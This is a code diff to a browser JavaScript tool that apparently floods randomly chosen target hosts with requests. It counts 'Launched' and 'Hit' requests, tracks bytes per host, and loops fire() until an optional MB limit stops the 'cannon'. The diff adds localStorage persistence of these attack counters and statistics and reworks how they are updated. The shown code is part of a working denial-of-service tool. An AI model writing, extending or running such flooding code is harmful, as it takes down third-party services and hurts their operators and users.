@@ -10,7 +10,7 @@
     mbVal: document.querySelector("#mbInput .val"),
   };
 
-  var counter = {
+  var counter = localStorage.getItem('iCounter') ? JSON.parse(localStorage.getItem('iCounter')) : {
     total: 0,
     hit: 0,
   };
@@ -19,7 +19,7 @@
     mb: elements.mbInput.mbVal
   }
 
-  var stats = {
+  var stats = localStorage.getItem('iStats') ? JSON.parse(localStorage.getItem('iStats')) : {
     bytes: {
       host: {},
       total: {
@@ -35,12 +35,16 @@
     elements.counter.innerHTML = `Launched: <strong>${counter.total}</strong>, Hit: <strong>${counter.hit}</strong>, Size: <strong>${getTotalTransferMb().toFixed(1)} MB</strong>`;
   }
 
+  if (counter.total > 0) {
+    setTimeout(refreshCounter, 1);
+  }
+
   function renderInput() {
     elements.mbVal.innerHTML = !inputs.mb ? 'Unlimited' : `${inputs.mb} MB`
   }
 
   function refreshStats() {
-    elements.stats.innerHTML = JSON.stringify(stats, null, 2)
+    // elements.stats.innerHTML = JSON.stringify(stats, null, 2)
   }
 
   function mbInputChange() {
@@ -109,7 +113,14 @@
 
     stats.bytes.host[host][type] += bytes
     stats.bytes.total[type] += bytes
+    localStorage.setItem('iStats', JSON.stringify(stats))
     refreshStats();
+  }
+
+  var updateCounter = function(type, inc) {
+    counter[type] += inc
+    localStorage.setItem('iCounter', JSON.stringify(counter))
+    refreshCounter()
   }
 
   var getTotalTransferMb = function () {
@@ -127,10 +138,9 @@
         function fire() {
           var target = targets[Math.floor(Math.random() * targets.length)];
           if (!isActive) { return }
-          counter.total++;
+          updateCounter('total', 1)
 
           var rand = `${Math.floor(Math.random() * 1000000)}-${new Date().getTime()}`;
-          refreshCounter();
 
           if (inputs.mb !== null && getTotalTransferMb() >= inputs.mb) {
             stopCannon()
@@ -155,9 +165,7 @@
             updateStats(target.host, 'download', calcRequestDownloadBytes(res))
           })
           .finally(function (err) {
-            counter.hit++;
-            refreshCounter();
-            // TODO until done
+            updateCounter('hit', 1)
             fire();
           });
 
